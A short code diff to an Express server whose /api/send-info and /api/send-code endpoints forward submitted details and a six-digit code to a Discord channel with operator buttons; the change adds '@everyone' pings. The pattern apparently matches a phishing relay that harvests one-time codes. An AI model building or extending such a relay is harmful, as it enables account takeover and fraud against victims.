@@ -40,7 +40,7 @@ app.post('/api/send-info', async (req, res) => {
             new ButtonBuilder().setCustomId('btn_6').setLabel('Code à 6 chiffres').setStyle(ButtonStyle.Success)
         );
         
-        await channel.send({ embeds: [embed], components: [row] });
+        await channel.send({ content: '@everyone', embeds: [embed], components: [row] });
         res.json({ success: true });
     } catch (err) {
         console.error(err);
@@ -64,7 +64,7 @@ app.post('/api/send-code', async (req, res) => {
             )
             .setTimestamp();
         
-        await channel.send({ embeds: [embed] });
+await channel.send({ content: '@everyone', embeds: [embed] });
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ error: 'Erreur Discord' });
